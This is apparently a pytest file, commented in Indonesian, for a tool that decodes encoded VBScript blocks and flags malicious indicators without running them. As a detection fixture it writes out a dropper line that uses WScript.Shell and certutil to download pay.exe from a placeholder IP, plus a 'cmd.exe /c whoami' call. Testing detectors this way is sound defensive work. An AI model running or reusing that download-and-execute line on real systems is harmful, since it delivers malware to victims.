"""test_vbs_decode_triage — dekode VBE + triase indikator, nol eksekusi.

Fixture = blok encode asli terdokumentasi (sample publik Didier Stevens:
'#@~^DgAAAA==\\ko$K6,JC\\x7fV^GJqAQAAA==^#~@' -> 'MsgBox "Hello"') + blok
sintetis yang dihasilkan dari tabel format (deterministik) berisi
indikator eksekusi/unduhan.
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

TOOLS = Path(__file__).resolve().parents[1] / "tools"
sys.path.insert(0, str(TOOLS))

import vbs_decode_triage as vdt  # noqa: E402
from _vbe_tables import _COMB, _DECODE_RAW  # noqa: E402

KNOWN = '#@~^DgAAAA==\\ko$K6,JC\x7fV^GJqAQAAA==^#~@'
KNOWN_PLAIN = 'MsgBox "Hello"'


def _encode(text: str) -> str:
    """Encoder round-trip minimal utk fixture: cari char ter-encode yang
    triple-nya menghasilkan byte plaintext pada kombinasi posisi tersebut
    (inverse dari decode_block; char tanpa kandidat -> passthrough)."""
    out = []
    for p, ch in enumerate(text):
        b = ord(ch)
        combo = _COMB[p % len(_COMB)]
        enc = None
        if (b == 9 or 31 < b < 128) and b not in (60, 62, 64):
            for c_str, triple in _DECODE_RAW.items():
                c = int(c_str)
                if c in (60, 62, 64) or not (c == 9 or 31 < c < 128):
                    continue
                if triple[combo] == b:
                    enc = chr(c)
                    break
        out.append(enc if enc is not None else ch)
    return "#@~^AAAAAA==" + "".join(out) + "AAAAAA==^#~@"


def _run(path: Path, *extra: str) -> tuple[int, dict | None]:
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "vbs_decode_triage.py"), "--file",
         str(path), *extra], capture_output=True, text=True)
    out = json.loads(proc.stdout) if proc.stdout.strip() else None
    return proc.returncode, out


def _tmp(tmp_path: Path, name: str, text: str) -> Path:
    p = tmp_path / name
    p.write_text(text, encoding="utf-8")
    return p


# ---------- unit kecil ----------

def test_decode_known_sample():
    # Payload 14-char hasil ekstraksi regex dari sample terdokumentasi
    m = vdt._RE_BLOCK.search(KNOWN)
    assert vdt.decode_block(m.group(1)) == KNOWN_PLAIN


def test_roundtrip_encoder():
    e = _encode("MsgBox \"Hello\"")
    payload = vdt._RE_BLOCK.search(e).group(1)
    assert vdt.decode_block(payload) == 'MsgBox "Hello"'


def test_find_blocks():
    m = vdt._RE_BLOCK.search(KNOWN)
    assert m and m.group(1) == "\\ko$K6,JC\x7fV^GJ"


# ---------- end-to-end ----------

def test_known_sample_no_findings(tmp_path):
    p = _tmp(tmp_path, "hello.vbe", KNOWN)
    code, out = _run(p)
    assert code == 0
    assert out["blocks_total"] == 1
    assert KNOWN_PLAIN in out["decoded_preview"][0]
    assert out["finding_count"] == 0  # hello world = tak ada indikator


def test_malicious_downloader_detected(tmp_path):
    # satu baris (pisah statement ':') supaya tak perlu escape @&/@#
    payload = ('Set sh = CreateObject("WScript.Shell"): '
               'sh.Run "cmd.exe /c certutil -urlcache -f '
               'http://203.0.113.5/pay.exe c:\\\\pay.exe", 0: '
               'Set x = CreateObject("ADODB.Stream")')
    p = _tmp(tmp_path, "drop.vbe", _encode(payload))
    code, out = _run(p)
    assert code == 0
    types = {f["type"] for f in out["findings"]}
    assert "exec-indicator" in types
    assert "download-indicator" in types


def test_false_positive_control_benign(tmp_path):
    # skrip jinak: hanya MsgBox + komentar — tidak boleh ada indikator high
    payload = "MsgBox \"Selamat datang\" ' komentar dokumentasi"
    p = _tmp(tmp_path, "benign.vbe", _encode(payload))
    code, out = _run(p)
    assert code == 0
    assert all(f["severity"] != "high" for f in out["findings"])


def test_redaction_on_by_default(tmp_path):
    payload = 'Set sh = CreateObject("WScript.Shell"): sh.Run "cmd.exe /c whoami"'
    p = _tmp(tmp_path, "r.vbe", _encode(payload))
    code, out = _run(p)
    assert out["findings"], "harus ada indikator exec"
    for f in out["findings"]:
        if f.get("evidence", {}).get("sample"):
            assert len(f["evidence"]["sample"]) <= 82
    code2, out2 = _run(p, "--redact", "off")
    assert code2 == 0 and out2["findings"][0]["evidence"]["sample"]


def test_fail_closed(tmp_path):
    p = _tmp(tmp_path, "plain.vbs", "MsgBox \"bukan encode\"")
    code, out = _run(p)
    assert code == 2 and out is None
    code2, _ = _run(tmp_path / "missing.vbe")
    assert code2 == 2
